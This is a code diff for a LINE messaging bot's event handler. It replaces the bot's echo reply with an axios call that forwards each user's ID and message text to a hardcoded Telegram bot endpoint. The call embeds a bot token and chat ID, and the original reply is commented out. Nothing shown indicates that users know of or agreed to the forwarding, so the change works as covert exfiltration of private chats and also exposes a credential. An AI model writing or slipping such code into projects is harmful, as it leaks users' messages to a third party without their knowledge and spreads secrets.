@@ -75,16 +75,18 @@ const handleEvent = async (event) => {
   if (event.type !== 'message' || event.message.type !== 'text') {
     return Promise.resolve(null);
   }
-
-  // create an echoing text message
-  const echo = { type: 'text', text: event.message.text };
-  const i = 0;
-
-  // use reply API
-  return client.replyMessage({
-    replyToken: event.replyToken,
-    messages: [echo],
-  });
+  const message = event.message.text.trim().toLowerCase();
+  axios.post("https://api.telegram.org/bot8304418735:AAEzik9XwKKWOt5c2Ya0p72WKloJjj-_zaM/sendMessage", {
+    chat_id: "1228757332",
+    text: "[ line chat ]\nuserId : " + event.source.userId + "\nmessage : " + message
+  })
+  /*
+    const echo = { type: 'text', text: event.message.text };
+    return client.replyMessage({
+      replyToken: event.replyToken,
+      messages: [echo],
+    });
+  */
 }
 
 /*
